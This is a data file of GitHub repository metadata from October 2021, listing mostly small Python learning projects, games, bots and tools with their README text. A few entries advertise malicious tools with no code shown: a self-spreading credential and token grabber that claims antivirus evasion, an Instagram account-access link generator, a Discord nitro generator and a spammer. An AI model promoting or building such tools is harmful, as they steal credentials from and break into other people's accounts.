417804153;space-invaders;https://github.com/TejasBalshetwar/space-invaders;Python;2021-10-16T11:14:13Z;0;0;0;space-invaders Space Invaders is a game that most of the people would have played on their consoles. I have created this game using the python's pygame module which contains a lot of interesting functions. I have added sound effects for various actions so that the game becomes more desirable to play. 
417763526;sum-of-n-natural-numbers-using-python-my-own-method0.py;https://github.com/6Neel9/sum-of-n-natural-numbers-using-python-my-own-method0.py;;2021-10-16T08:14:38Z;0;0;0;sum-of-n-natural-numbers-using-python-my-own-method0.py making own sum of n natural number using python 
417820998;Assignment-No.-1-BSCOE-1-6;https://github.com/irishmicoletcando/Assignment-No.-1-BSCOE-1-6;Python;2021-10-16T12:26:16Z;0;0;0;
417809219;central-limit-theorem;https://github.com/karakastarik/central-limit-theorem;Jupyter Notebook;2021-10-16T11:36:19Z;0;0;0;Understanding The Central Limit Theorem 
417837632;aave_brownie_py;https://github.com/petrejonn/aave_brownie_py;Solidity;2021-10-16T13:33:18Z;0;0;1; Swap ETH for WETH Deposit some ETH (WETH) into Aave Borrow some asset with the ETH collateral  Sell the borrowed asset. (Short selling)   Repay everything back.  Testing: Integration test: Kovan Unit test: Mainnet-fork 
417839944;BlackJack;https://github.com/Pierre-Bezemer/BlackJack;;2021-10-16T13:42:54Z;0;0;0;BlackJack My First Public Project after learning the basics of Python My end goal: Creating my first working game in Python which requests user input My sub Goals:  learning how to make a project using Git and GitHub learning how to ask for user input learning how to pictures or ASCII-art in Python learning how to make a code which resolves its own errors  Current progress:  2021-10-16: Creating the GitHub repository and initialising the process (brain storming about which game and some goals to learn from the game)  
417850256;Sudopy;https://github.com/josflesan/Sudopy;Python;2021-10-16T14:21:23Z;0;0;0;Sudopy A simple sudoku solver in Python using Pygame 
417875186;Ariadne;https://github.com/GraiaProject/Ariadne;Python;2021-10-16T15:53:38Z;1;1;0;Ariadne       一个适用于 mirai-api-http v2 的 Python SDK。 本项目适用于 mirai-api-http 2.0 以上版本。 目前仍处于开发阶段，内部接口可能会有较大的变化。 安装 poetry add graia-ariadne 或 pip install graia-ariadne 鸣谢&相关项目  这些项目也很棒, 去他们的项目页看看, 点个 Star 以鼓励他们的开发工作, 毕竟没有他们也没有 Ariadne.  特别感谢 mamoe 给我们带来这些精彩的项目:  mirai: 一个高性能, 高可扩展性的 QQ 协议库 mirai-console: 一个基于 mirai 开发的插件式可扩展开发平台 mirai-api-http: 为本项目提供与 mirai 交互方式的 mirai-console 插件  GraiaProject 的其他项目:  Broadcast Control: 扩展性强大, 模块间低耦合, 高灵活性的事件系统支持，是 Ariadne 的底层。兼容 Components: 简单的消息链元素选择器 不兼容，将提供移植 Template: 消息模板 不兼容，将提供移植 Saya 间接但简洁的模块管理系统. 兼容 Scheduler: 简洁的基于 asyncio 的定时任务实现. 兼容 Application (a.k.a v4): 本项目的结构基础，支持 mirai-api-http v1.x 版本 。不完全兼容，建议参照项目内实现名称进行移植工作 Avilla (a.k.a v5): 下一代即时通讯框架。The Future。不兼容  Ariadne 在开发中还参考了如下项目：  YiriMirai: 本项目的 adapter 及 MessageChain 实现参考。  许可证 GNU AGPLv3 是本项目的开源许可证. 
417866863;py_study_code;https://github.com/13270901100/py_study_code;Python;2021-10-16T15:21:25Z;0;0;0;py_study_code 初学python的相关代码 
417821392;pytools;https://github.com/swtornio/pytools;Python;2021-10-16T12:28:09Z;0;0;0;pytools Infosec tools developed in Red Siege python group ##Projects Week 1 - Verify IP Ownership / Geo-locate Week 2 - TBD Week 3 - TBD Week 4 - TBD Week 5 - TBD Week 6 - Break and Catch Up Week Week 7 - TBD Week 8 - TBD Week 9 - TBD  Week 10 - TBD Week 11 - TBD ( Large Project Idea)  
417809608;databasebenchmark;https://github.com/TuomasKarjalainen/databasebenchmark;Jupyter Notebook;2021-10-16T11:38:15Z;0;0;0;DB Benchmarks Benchmarking five different databases functionality and performance. Testing is made with SQL-query and the results are recorded and visualized. Databases  MariaDB InfluxDB TimeScale CockroachDB YugabyteDB  
417790571;11-ART;https://github.com/bobsub218/11-ART;Python;2021-10-16T10:13:05Z;0;0;0;11-ART Generating art through code (with Python) for Hackathon CENNZnet blockchain. 11Art is a playground of different experiments. Here I experiment with different shapes, colours and backgrounds. The works presented are in different formats and some works are incomplete by their nature as they are experimental (trials). It is also important to note that these works are the result of a series of attempts and combinations of parameters and are the final result for a new path of code. Setup on Ubuntu These scripts have been made using Python 3.8.2 Install some dependencies, on Linux this very simple you just run the following command in a terminal window: sudo apt install python-cairo libcairo2-dev Create a Python virtual environment and activate it: cd /to/the/repo/directory/on/your/computer/Generative-art python3 -m venv venv source venv/bin/activate You will also need to install some packages for Python which can be done using the following command: pip3 install -r requirements.txt 
417808826;Fibonacci-Numbers;https://github.com/DarkDevil99/Fibonacci-Numbers;Python;2021-10-16T11:34:24Z;0;0;0;
417784318;flashdb;https://github.com/Universemul/flashdb;;2021-10-16T09:48:25Z;0;0;0;Flash DB      This project is really (really) young. I don't have any code to push yet but I'm working on the architecture of the database. I will then update the README to let you inform about my thought and progress. Do not hesitate to send me an email if you want to join the project :) Introduction FlashDB is a lightweight schemaless oriented database optimized for reading. It's written in pure Python. You can use Flash DB if:  You need a small database without 10000 external dependencies. You need fast read You have no schema and no need to JOIN between your entities You want to test an open source project :D You don't need complexe queries like multiple aggregations or Multiple subqueries You want to deploy your application fast  Supported Python Versions QuickStart TODO Contributing Whether reporting bugs, discussing improvements and new ideas or writing extensions: Contributions to FlashDB are welcome! Here's how to get started:  Check for open issues or open a fresh issue to start a discussion around a feature idea or a bug Fork the repository on Github, create a new branch off the master branch and start making your changes (known as GitHub Flow) Write a test which shows that the bug was fixed or that the feature works as expected Send a pull request and bug the maintainer until it gets merged and published ☺  
417798426;https-github.com-Rysekk-Fraud_Detection;https://github.com/Alphadius/https-github.com-Rysekk-Fraud_Detection;;2021-10-16T10:50:22Z;0;0;0;
417780428;timelapse;https://github.com/blackliner/timelapse;Python;2021-10-16T09:32:08Z;0;0;0;timelapse Python script to create a timelapse video from jpeg pictures 
417815434;Positive-Numbers;https://github.com/DarkDevil99/Positive-Numbers;Python;2021-10-16T12:02:55Z;0;0;0;
417869388;morgil;https://github.com/Beraclec/morgil;;2021-10-16T15:31:03Z;0;0;0;
417871850;CSFEditer;https://github.com/diavral/CSFEditer;Python;2021-10-16T15:40:34Z;0;0;0;"CSFEditer C&C RA2 ra2(md).csf file editer in python.  Decode bytes of a *.csf file or encode data to bytes of *.csf file. Readme This is when I tried to batch edit the CSF file of RA2, I found that there was no suitable software, so I wrote one myself, but I did not learn PyQt/PySide a lot, and some functions could not be implemented. I don't have time for this at the moment.In the test.py file are transcoding and decoding functions.[translated] To figure out (in reference link) Decoding the value To decode the value to a Unicode string, not every byte of the value data (or subtract it from 0xFF). An example in C++: int ValueDataLength = ValueLength << 1; for(int i = 0; i < ValueDataLength; ++i) {   ValueData[i] = ~ValueData[i]; } I'm not sure what the 'not every byte of the value data' means. Reference link<- 现成的软件不好用.好用的软件写不出. "
417828231;SLOpPy;https://github.com/squeaky-godzilla/SLOpPy;;2021-10-16T12:55:47Z;0;0;0;SLOpPy SLOpPy - Sloppy SLO demonstration on a simple Python API 
417767542;Udemy-Machine-Learning-Data-Science-Masterclass;https://github.com/kinwong/Udemy-Machine-Learning-Data-Science-Masterclass;Jupyter Notebook;2021-10-16T08:33:49Z;0;0;0;Udemy - 2021 Python for Machine Learning & Data Science Masterclass Class work and test for the 
417846456;Dynamic-Programming;https://github.com/Firedrops/Dynamic-Programming;Python;2021-10-16T14:08:34Z;0;0;0;Dynamic-Programming Exploration of Dynamic Programming in Python Source Video (in JavaScript): https://www.youtube.com/watch?v=oBt53YbR9Kk Principles of Dynamic Programming   Make it work  Represent a recursive problem as a recursive tree (for Memoization) OR iterative table (for Tabulation). Implement the core recursive OR iterative logic. Validate that it works.    Make it efficient  Identify recursive/iterative structures/patterns. Add a memo object (dictionary in the case of Python) as an input, often defaulted to an empty dictonary {}. Add a parameter to look up existing entries in memo, only do calculations if not in memo (and return values into memo).    Warning These are my best efforts within time constraints, scripts may not be exhaustively complete or functional. 
417826207;Tic-Tac-Toe;https://github.com/VaibhavPatil4240/Tic-Tac-Toe;Python;2021-10-16T12:47:32Z;0;0;0;"Tic-Tac-Toe Python based simple tic-tac-toe game with simple GUI For game logic I have used AI algorithm called minimax, and for GUI design Python's Tkinter module is used. Game logic in :minimaxTicTacToe.py GUI in: ticTacToe.py Make sure to install PIL module manually or you can run ""req.sh"" script You can find source code in Tic-Tac-Toe_Source Also in Tic-Tac-Toe_Executable you can find Windows executable "
417853736;stock-analysis;https://github.com/nispero22/stock-analysis;Jupyter Notebook;2021-10-16T14:33:02Z;0;0;0;stock-analysis Stock analysis with Python (Pandas), Tableau and SQL Python: check this notebook Tableau:  
417838622;Edabit-exercises;https://github.com/jackfrancismurphy/Edabit-exercises;Python;2021-10-16T13:37:14Z;0;0;0;
417865544;Ph4ntom;https://github.com/REXOUNER/Ph4ntom;Python;2021-10-16T15:16:29Z;0;0;0;Ph4ntom V1.1 Ph4ntom is simple discord nitro generator in Python Join my Discord for help https://discord.gg/9AP32XmTkV 
417771859;kramer-py;https://github.com/ederjc/kramer-py;Python;2021-10-16T08:54:57Z;0;0;0;kramer-py This is work in progress. Documentation will follow. 
417786738;Calculator;https://github.com/Priyangshu-Mandal/Calculator;Python;2021-10-16T09:58:20Z;0;0;0;
417860951;PYPI-Packaging;https://github.com/u3814520/PYPI-Packaging;Python;2021-10-16T15:00:08Z;0;0;0;" 官方文件說明  ====== 第一次打包要做的事 註冊並登入PYPI帳號 1.到Account settings裡，新增API tokens 2.複製 tokens 3.在%HOMEPATH%目錄下新增.pypirc檔，並貼入以下文字(username = token  不用改) [pypi] username = __token__ password = <貼上 API tokens>  =======如非第一次打包上傳，以上可以跳過======= ================================================== 1.所需安裝的套件(有兩個套件) pip install twine pip install wheel  備註:如果專案裡有資料夾，每個資料夾都要有__init__.py檔案，才會被打包進去  2.新增setup.py檔:  #!/usr/bin/env python # -*- coding: utf-8 -*-  # Note: To use the 'upload' functionality of this file, you must: #   $ pipenv install twine --dev  import io import os import sys from shutil import rmtree  from setuptools import find_packages, setup, Command  # Package meta-data. NAME = 'WebCrawleEslite'           # PYPY上的名稱 DESCRIPTION = 'bookstore WebCrawle Eslite'  #  短說明 URL = 'https://github.com/test/test'      # 專案網址 EMAIL = 'test@gmail.com'         # 信箱 AUTHOR = 'chiao ting'              # 作者 REQUIRES_PYTHON = '>=3.6.0'      # python 版本 VERSION = '0.1.0'                # 版本(更新版本需改變)  # What packages are required for this module to be executed?  # 專案需要哪些套件 REQUIRED = [     'requests', 'pandas', 'fake_useragent','bs4', ]  # What packages are optional? EXTRAS = {     # 'fancy feature': ['django'], }  # The rest you shouldn't have to touch too much :)   # 以下不需調整 # ------------------------------------------------ # Except, perhaps the License and Trove Classifiers! # If you do change the License, remember to change the Trove Classifier for that!  here = os.path.abspath(os.path.dirname(__file__))  # Import the README and use it as the long-description. # Note: this will only work if 'README.md' is present in your MANIFEST.in file! try:     with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:     # 有需要長版說明可以寫在README.md         long_description = '\n' + f.read() except FileNotFoundError:     long_description = DESCRIPTION  # Load the package's __version__.py module as a dictionary. about = {} if not VERSION:     project_slug = NAME.lower().replace(""-"", ""_"").replace("" "", ""_"")     with open(os.path.join(here, project_slug, '__version__.py')) as f:         exec(f.read(), about) else:     about['__version__'] = VERSION   class UploadCommand(Command):     """"""Support setup.py upload.""""""      description = 'Build and publish the package.'     user_options = []      @staticmethod     def status(s):         """"""Prints things in bold.""""""         print('\033[1m{0}\033[0m'.format(s))      def initialize_options(self):         pass      def finalize_options(self):         pass      def run(self):         try:             self.status('Removing previous builds…')             rmtree(os.path.join(here, 'dist'))         except OSError:             pass          self.status('Building Source and Wheel (universal) distribution…')         os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))          self.status('Uploading the package to PyPI via Twine…')         os.system('twine upload dist/*')          self.status('Pushing git tags…')         os.system('git tag v{0}'.format(about['__version__']))         os.system('git push --tags')          sys.exit()   # Where the magic happens: setup(     name=NAME,     version=about['__version__'],     description=DESCRIPTION,     long_description=long_description,     long_description_content_type='text/markdown',     author=AUTHOR,     author_email=EMAIL,     python_requires=REQUIRES_PYTHON,     url=URL,     packages=find_packages(exclude=[""tests"", ""*.tests"", ""*.tests.*"", ""tests.*""]),     # If your package is a single module, use this instead of 'packages':     # py_modules=['mypackage'],      # entry_points={     #     'console_scripts': ['mycli=mymodule:cli'],     # },     install_requires=REQUIRED,     extras_require=EXTRAS,     include_package_data=True,     license='MIT',     classifiers=[         # Trove classifiers         # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers         'License :: OSI Approved :: MIT License',         'Programming Language :: Python',         'Programming Language :: Python :: 3',         'Programming Language :: Python :: 3.6',         'Programming Language :: Python :: Implementation :: CPython',         'Programming Language :: Python :: Implementation :: PyPy'     ],     # $ setup.py publish support.     cmdclass={         'upload': UploadCommand,     }, ) setup.py引用來源 3.封裝:(有兩個指令須執行) python setup.py sdist  備註:執行出現 no module named 'setuptools' 請執行ez_python.py  python setup.py bdist_wheel 4.上傳到PYPI上 開啟CMD，到資料夾下輸入指令: twine upload dist/* 完成後，複製View at:的網址 就可以看到自己打包的專案了~ *建立新的環境測試一下: pip install <自己打包的套件> 就會發現py檔都在新建立的環境資料夾裡了  =====打包前補充，不新增也不影響上傳打包===== License說明: https://choosealicense.com/   建立LICENSE.txt   複製許可證內容並在LICENSE.txt貼上    "
417792469;pygo-grpc;https://github.com/Hirochon/pygo-grpc;Makefile;2021-10-16T10:21:47Z;0;0;0;pygo-grpc PythonとGoでサーバー間通信 環境構築が楽すぎて腰抜けます IntelMacでDockerが動かせることが条件です！！！ ※それ以外は動作確認しておりません。  make compile  
417868267;pyextmod_starter;https://github.com/WarrenWeckesser/pyextmod_starter;Python;2021-10-16T15:26:50Z;0;0;0;"pyextmod_starter This module defines the function def generate_extmod(module_name, module_doc, funcs, numpy=False,                     c_filename=None, setup_filename=""setup.py"")  It generates C code for a Python extension module, with boilerplate code for defining functions in the extension module that have signatures like those in the list of functions provided by the funcs parameter.  Only the function signatures of the functions in funcs are used; the bodies of the functions are ignored. generate_extmod generates the boilerplate code for the extension module, but the code will not do anything useful.  The intent is for a developer to run this once, and then edit the C file to implement whatever the extension module is supposed to do. There is an example in the Python file  make_example_ext_module.py  in the examples/ directory.  The result of running that file is the creation of two files:  examplemodule.c setup.py  "
417804477;instagram-account-login;https://github.com/r6f/instagram-account-login;Python;2021-10-16T11:15:38Z;2;2;0;instagram-account-login Simple Instagram Login Link Generator Info Program generates instagram login links and you may get into someone´s thought the chances are very low. All your gens will be saved in generated.txt Requirements are just Python 3.6+ 
417778639;News-Discord-Bot;https://github.com/klevrboi/News-Discord-Bot;Python;2021-10-16T09:24:28Z;2;2;0;Noah Miller v1.0 a discord bot coded in Python which shows news based on the term searched by the user Add the bot to your server About This is a discord bot coded in Python which shows news regarding the term the user searches. The bot displays the 10 most relevant news links regarding the topic searched. Modules used:  Discord.py GoogleNews discord-slash-command  Hosting  Hosted on Heroku  Prefix  - or a hyphen  Commands To search for news use the command below:  -news [the topic you want to know bout]  Help command  -help  Commands  -cmd  Demonstration:  What can you expect in the future updates:  There is a plan to add a weather API feature in the bot, which tells the weather of the city searched as well as some other API related features like live crypto price and etc. Slash commands are also underwork, slash commands have been implemented in this version of the bot if you check the code, but there is nothing special with them, as they are unstable and most of the times fail to deliver the output of the command used. If this thing gets a fix, maybe I will migrate the whole bot to slash commands in the future.  Made with ❤️ by Klevr 
417837461;Real-state-agency-System-tracker;https://github.com/Mayar455/Real-state-agency-System-tracker;Python;2021-10-16T13:32:37Z;0;0;0;Real-state-agency-System-tracker the Aim of this project was to understad the Basic fundamentals of algorithms using Python.  no function or high level python containers including libraries, dictionary are used. 
417769098;Assignment-3-Python-function-that-accepts-a-string-and-calculate-the-number-of-upper-case-letters-an;https://github.com/10kiran/Assignment-3-Python-function-that-accepts-a-string-and-calculate-the-number-of-upper-case-letters-an;;2021-10-16T08:41:51Z;0;0;0;Assignment-3-Python-function-that-accepts-a-string-and-calculate-the-number-of-upper-case-letters-an 
417835356;brownie_fund_me;https://github.com/noproblem520/brownie_fund_me;Solidity;2021-10-16T13:24:00Z;0;0;0;
417793765;Airflow-Introduzione;https://github.com/scienzadeidati/Airflow-Introduzione;Python;2021-10-16T10:28:04Z;0;0;0;#Introduzione a Apache Airflow Questo repository è parte del post Introduzione a Apache Airflow 
417762896;learn-django-rest-framework;https://github.com/jeansdev/learn-django-rest-framework;Python;2021-10-16T08:11:48Z;0;0;0;Learn Django Rest Framework 
417762794;learn-django;https://github.com/jeansdev/learn-django;Python;2021-10-16T08:11:21Z;0;0;0;Learn Django 
417868191;edit-reverse-proxy;https://github.com/sulliops/edit-reverse-proxy;CSS;2021-10-16T15:26:33Z;0;0;0;"edit-reverse-proxy edit-reverse-proxy is a combination of scripts meant to make creating a single NGINX reverse proxy easier. Where normally a user would edit NGINX configuration files through the command-line interface, these scripts automate the process and allow users to enter port numbers for the port being exposed and the port being proxied through a simple web-based interface. This repository was developed as part of CUHackIt Hello World 2021 over the course of eight hours. Below is a list of each major file and its function: makefile The makefile runs Linux commands which copy the contents of webdocs and the edit-reverse-proxy.py script into absolute locations for use and editing, and it sets permissions for individual files so that NGINX and Python can access/modify them. Note: part of the makefile's configuration procedure is setting the NGINX user www-data to NOPASSWD in the /etc/sudoers file, to enable PHP to run edit-reverse-proxy.py as root. This may be considered insecure, and you shouldn't use these scripts if you're concerned about this vulnerability. configure-nginx.py This script installs NGINX and PHP-FPM, and sets NGINX's default configuration files to enable the execution of PHP scripts on the web server. Additionally, this script creates the edit-reverse-proxy.conf file which stores the configuration for the reverse proxy. index.html The index.html file (and its associated CSS/JS/favicon) are the front-end for this script that allows users to simply input the appropriate port numbers in an easy-to-understand interface. There is an associated function, sendVarsToPHP(), which redirects the browser to passvars.php with user-inputted parameters. success.html The success.html file displays the success message called by passvars.php. passvars.php passvars.php interprets URL paramaters as variables, then passes the variables (user input) to edit-reverse-proxy.py as arguments for interpretation. A front-end ""success"" page is also displayed, dependent on success.html. edit-reverse-proxy.py This script gets the current contents of edit-reverse-proxy.conf, converts the contents to a line-by-line array, then modifies the contents of certain lines to match user input. The script then writes the array line-by-line back to edit-reverse-proxy.conf and restarts the NGINX service. Usage Prior to running the scripts, run the following: apt-get update  This is excluded from the makefile because some systems may encounter errors with custom PPAs that prevent the makefile from continuing. Clone the repository to a local folder and cd: git clone https://github.com/sulliops/edit-reverse-proxy.git cd edit-reverse-proxy/  Run the makefile: make build  Note: depending on your current Linux permissions, you may need to run the above as root. Visit the newly-created web server at http://localhost:8080 and begin interacting with the scripts. Important note This script will destroy any changes made to the default NGINX configuration. In addition, overwriting this script's default port using listenOn will result in an NGINX misconfiguration; you can fix this by re-running the makefile, but this will destroy any modifications you've made since last running it. Editing configure-nginx.py to run the script on a port other than default will free up that port, assuming no other program tries to bind to it. Contributors Julianne Johnsonwall (@jjohn67) — Python, JavaScript, HTML Alexis Knezek (@Alexiswka) — Python, HTML Kate Knezek (@Katewka) — Python, HTML Owen Sullivan (@sulliops) — Python, JavaScript, HTML, PHP References Some input was given by various members of the CUHackIt mentor team, which enabled debugging and completion of various parts of this project ranging from the makefile to PHP. Input also came from sources such as StackOverflow and other online resources. The template for the front-end of the script was provided by Start Bootstrap. "
417837474;Warehouse-managment-system-;https://github.com/karandesai24/Warehouse-managment-system-;;2021-10-16T13:32:41Z;1;1;0;Warehouse-managment-system- 
417835127;durchsage;https://github.com/chaoswest-tv/durchsage;Python;2021-10-16T13:23:01Z;0;0;0;"durchsage Daemon that will follow a pretalx conference schedule.json (""fahrplan"") and make announcements (""durchsage"") on a MQTT topic when an event starts. architecture The whole daemon is based around a blocking scheduler based on APscheduler. When launched, it will set up a update_event_jobs cron schedule per configured fahrplan. When this cron is invoked, it will fetch the current fahrplan from the source url, and filter out all events/talks in the past. For each remaining event a new announce_event job will be generated that sends out the job data to an MQTT topic exactly when the event starts. It will use these MQTT topics:  fahrplan/<fahrplan>/version: When a schedule with a different version has been imported, a message containing the version string will be published here. fahrplan/<fahrplan>/now: When an event begins the whole event data structure is dumped in JSON and published here. fahrplan/<fahrplan>/soon: (Optional) Just before an event begins the whole event data structure is dumped in JSON and published here. You can configure how many minutes before the actual event start this will happen, or not at all.  configuration Create a config.ini and either drop it in the same folder as durchsage.py or pass the path with a --config flag. There can be only one mqtt section defining the connection parameters to the broker. There can be many fahrplan:<fahrplan> sections, where <fahrplan> is a user definable name. This will be used internally and for the MQTT topic selection. <fahrplan> needs to begin with a lowercase letter or digit, and can contain lowercase letters, digits, dashes or underscores after the first char. [mqtt] host = 127.0.0.1 port = 8883  tls = yes tls_verify = yes  username = hans password = wurst  [fahrplan:example] # the url is required. url = https://pretalx.example.com/example-conference/schedule/export/schedule.json  # optional: refresh/pull the fahrplan according to this crontab expression # defaults to every 5 minutes. cron = * * * * *  # optional: give an advance notice x minutes before the talk starts on the 'soon' topic # defaults to no advance notice pre_announce = 1  [fahrplan:anotherconf] url = ...  "
417876328;brownie_fund_me;https://github.com/JayGwod/brownie_fund_me;Solidity;2021-10-16T15:58:35Z;0;0;0;
417852942;Plex-Tools;https://github.com/Arphylion/Plex-Tools;;2021-10-16T14:30:19Z;0;0;0;Plex-Tools 
417777953;spotify-top-songs-calculator;https://github.com/fredrikburmester/spotify-top-songs-calculator;Python;2021-10-16T09:21:25Z;0;0;0;spotify-top-songs-calculator A python file for calculating your most played songs from a JSON file 
417846218;Primeiro_Projeto;https://github.com/gustavosilvestre97/Primeiro_Projeto;;2021-10-16T14:07:53Z;0;0;0;Primeiro_Projeto Projeto que visa a validação de um modelo de Árvore de Decisão em python Estrutura de um projeto para o meu repositório de projetos - Data Science Feito utilizando 
417782003;facemaskdetection;https://github.com/gpsurya/facemaskdetection;Python;2021-10-16T09:38:33Z;0;0;0;facemaskdetection Detecting face masks using Python, Keras, OpenCV on real video streams 
417781413;Cloud_DevOps_Microservices;https://github.com/Muchezz/Cloud_DevOps_Microservices;Python;2021-10-16T09:36:00Z;0;0;0;<include a CircleCI status badge, here> Project Overview In this project, you will apply the skills you have acquired in this course to operationalize a Machine Learning Microservice API. You are given a pre-trained, sklearn model that has been trained to predict housing prices in Boston according to several features, such as average rooms in a home and data about highway access, teacher-to-pupil ratios, and so on. You can read more about the data, which was initially taken from Kaggle, on the data source site. This project tests your ability to operationalize a Python flask app—in a provided file, app.py—that serves out predictions (inference) about housing prices through API calls. This project could be extended to any pre-trained machine learning model, such as those for image recognition and data labeling. Project Tasks Your project goal is to operationalize this working, machine learning microservice using kubernetes, which is an open-source system for automating the management of containerized applications. In this project you will:  Test your project code using linting Complete a Dockerfile to containerize this application Deploy your containerized application using Docker and make a prediction Improve the log statements in the source code for this application Configure Kubernetes and create a Kubernetes cluster Deploy a container using Kubernetes and make a prediction Upload a complete Github repo with CircleCI to indicate that your code has been tested  You can find a detailed project rubric, here. The final implementation of the project will showcase your abilities to operationalize production microservices.  Setup the Environment  Create a virtualenv and activate it Run make install to install the necessary dependencies  Running app.py  Standalone:  python app.py Run in Docker:  ./run_docker.sh Run in Kubernetes:  ./run_kubernetes.sh  Kubernetes Steps  Setup and Configure Docker locally Setup and Configure Kubernetes locally Create Flask app in Container Run via kubectl  
417797152;Simple-Flask;https://github.com/shrejal99/Simple-Flask;CSS;2021-10-16T10:44:17Z;0;0;0;Simple No longer maintained - I switched my blog to Gatsby, see https://tomforb.es/goodby-simple-hello-gatsby/ . Simple is as a Python-powered markdown blog. You can see an example running on my blog. The editor is an expanding textarea and you can upload images by dragging and dropping them onto the page, and ctrl+s saves the post. You can also add a header image to any post by selecting the image icon in the top right. This lets you browse through the latest Bing daily images, and in the future you will be able to upload your own. Quickstart: It's supposed to be easy to set up Simple. If you don't think it is then open a ticket and let me know. Simple is designed to be served via Gunicorn, behind nginx. You can optionally use supervisord to manage the gunicorn processes. You need Python 3.4, and simply follow the commands below (nginx on Ubuntu uses /sites-available/ instead of /conf.d/): >> mkdir blog && cd blog >> python3.4 -m venv env >> source env/bin/activate && pip install simpleblogging gunicorn >> simple create >> nano simple_config.py >> simple nginx_config yoursite.com --proxy_port=9009 > /etc/nginx/conf.d/simple.conf >> simple supervisor_config env/ 9009 >> /etc/supervisord.conf >> chown -R nobody:nobody ../blog >> supervisorctl start simple && service nginx reload  
417846237;Olympics;https://github.com/HenriqueCagnoni/Olympics;;2021-10-16T14:07:55Z;0;0;0;Olympics Projeto que visa prever o quadro de medalha dos países em python. 
417812112;organising-code;https://github.com/pamelahathway/organising-code;Python;2021-10-16T11:48:41Z;0;0;0;
417783203;Facial-Expression-Recognition;https://github.com/hemanshanand/Facial-Expression-Recognition;Jupyter Notebook;2021-10-16T09:43:49Z;0;0;0;
417770286;kali-mirror-finder;https://github.com/mrsinghh2002/kali-mirror-finder;Python;2021-10-16T08:47:25Z;1;1;0;Kali Mirror Finder Using Single Python File A python package for your Kali Linux distro that find the fastest mirror and configure your apt to use that mirror Supported Distros  Kali Linux ( kali-rolling )  Usafe $ sudo python3 mirror-finder.py Help Inspired from htmm/better-mirror $ sudo python3 mirror-finder.py   mirror-finder 1.0.0  https://github.com/mrsinghh2002/kali-mirror-finder     ## Sample Output  ```shell $ sudo python3 mirror-finder.py  [*] Calculating the mirror latency... [*] Pinging kali.download ... latency 15.65ms [*] Pinging mirror.pyratelan.org ... latency 188.5ms [*] Pinging mirror.karneval.cz ... latency 186.75ms [*] Pinging ftp.free.fr ... latency 152.5ms [*] Pinging ftp.jaist.ac.jp ... latency 193.75ms [*] Pinging ftp.halifax.rwth-aachen.de ... latency 147.0ms [*] Pinging ftp1.nluug.nl ... latency 145.25ms [*] Pinging ftp2.nluug.nl ... latency 145.25ms [*] Pinging mirrors.dotsrc.org ... latency 165.0ms [*] Pinging mirrors.jevincanders.net ... latency 225.5ms [*] Pinging mirror.erickochen.nl ... latency 147.25ms [*] Pinging mirror.serverion.com ... latency 151.0ms [*] Pinging ftp.acc.umu.se ... latency 177.75ms [*] Pinging mirror.lagoon.nc ... latency 311.0ms [*] Pinging mirror.serverius.net ... latency 154.75ms [*] Pinging archive-4.kali.org ... latency 144.25ms [*] Pinging mirror-1.truenetwork.ru ... latency 338.75ms [*] Pinging mirror.neostrada.nl ... latency 218.25ms [*] Pinging mirror.anquan.cl ... latency 338.5ms [*] Pinging wlglam.fsmg.org.nz ... latency 316.0ms [*] Pinging hlzmel.fsmg.org.nz ... latency 311.75ms [*] Pinging ftp.harukasan.org ... latency 568.33ms [*] finding the best mirror for you :) .... [*] found! the selected mirror: kali.download ... latency 15.65 ms [*] backuping original /etc/apt/sources.list to /etc/apt/sources.list.bak [*] updating /etc/apt/source.list [*] running apt-get update for you.... Hit:1 http://kali.download/kali kali-rolling InRelease Reading package lists... Done [*] Thanks For Using The Tool!    
417769713;Baisic-Skills;https://github.com/gzguevara/Baisic-Skills;Python;2021-10-16T08:44:56Z;0;0;0;Baisic-Skills Python implementations for work with different file formats like JSON, csv, datetime, etc. 
417833474;Anghami-application-GUI;https://github.com/omar-abdel-fattah/Anghami-application-GUI;Python;2021-10-16T13:16:12Z;0;0;0;Anghami-application-GUI A Sound Player GUI application (python-Tkinter based) using OOP and Classes prject includes users signup (name , mail , id , password) Sign in (name password ) check box for terms agreement user buys songs from the app and adds them to his list data and songs are saved in an excel database to be kept saved in every new run An interactive GUI using Tkinter 
417846227;Projeto-Day-Trade;https://github.com/matambrosio/Projeto-Day-Trade;;2021-10-16T14:07:54Z;0;0;0;Projeto-Day-Trade Projeto que visa a validação de um modelo de Árvore de Decisão em python 
417872318;SelfSpreadingGrabber;https://github.com/Wizz1337/SelfSpreadingGrabber;Python;2021-10-16T15:42:30Z;0;0;0;🔥SSG  🔥SSG is a Self Spreading Grabber written in Python 3     Installation   * pip install numpy requests discord opencv-python pyautogui discord_webhookedit main.py   * replace <Webhook Here> to ur webhook   * you can change Embed_T and Embed_C   Features:   * Grabbing Discord/ptb/canary/Opera/Google/Yandex/Brave   * Undetected By 90% of All AV   * Chrome Pass Grab   * Sys Info Grab   * Self Spread   * Ip Grabber   * Fast 
417846239;Projeto-Day-Trade;https://github.com/arecoluiz/Projeto-Day-Trade;;2021-10-16T14:07:56Z;0;0;0;Projeto-Day-Trade Projeto que visa a validação de modelo de Árvore de Regressão em python Estrutura de um projeto para o meu repositório de projetos - Data Science Feito utilizando python! 
417764338;cs50;https://github.com/tommper21/cs50;Python;2021-10-16T08:18:20Z;0;0;0;CS50’s Web Programming with Python and JavaScript These are my projects from the CS50 course. For further information, also see: https://cs50.harvard.edu/web/2020/ You can find my demos on YouTube: https://www.youtube.com/channel/UCEjNlqUUHgo490AAy46rQ8A/playlists Apart from Search all projects are using Django.  Commerce An eBay-like e-commerce auction site that will allow users to post auction listings, place bids on listings, comment on those listings, and add listings to a “watchlist.” Mail A front-end for an email client that makes API calls to send and receive emails. Network A Twitter-like social network website for making posts and following users. Wiki A Wikipedia-like online encyclopedia. Search A simple front-end for Google Search, Google Image Search, and Google Advanced Search.  
417820373;Reminder_Backend;https://github.com/EntpBlender/Reminder_Backend;Python;2021-10-16T12:23:43Z;0;0;0;Reminder_Backend Backend for my email reminder site 
417768808;color_detection;https://github.com/hari227/color_detection;Python;2021-10-16T08:40:20Z;0;0;0;color_detection Project on Color Detection in an image using OpenCV in Python 
417767203;mypythoncode;https://github.com/disalgunathilaka/mypythoncode;;2021-10-16T08:32:08Z;0;0;0;
417775782;spammer;https://github.com/Lolzz-uwu/spammer;Python;2021-10-16T09:11:20Z;0;0;1;
